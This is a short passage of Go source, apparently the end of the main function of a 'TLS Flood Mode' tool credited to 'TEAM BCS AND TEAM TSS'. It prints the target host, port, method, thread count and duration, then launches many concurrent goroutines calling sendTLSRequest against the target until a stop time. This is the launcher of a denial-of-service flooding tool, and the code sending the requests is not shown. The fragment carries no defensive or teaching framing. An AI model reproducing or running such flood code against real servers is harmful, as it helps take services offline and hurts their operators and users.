	fmt.Println("🚀 TLS Flood Mode ")
        fmt.Println(" *--------* Owner : TEAM BCS AND TEAM TSS *---------*")
	fmt.Printf("Target: %s | Port: %d | Method: %s | Threads: %d | Duration: %d sec | Debug: %v\n",
		host, port, method, threads, duration, debugHandshake)

	go printStatus(stopTime)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendTLSRequest(host, port, method, stopTime, &wg)
	}

	wg.Wait()
	fmt.Println("\n✅ Finished")
}
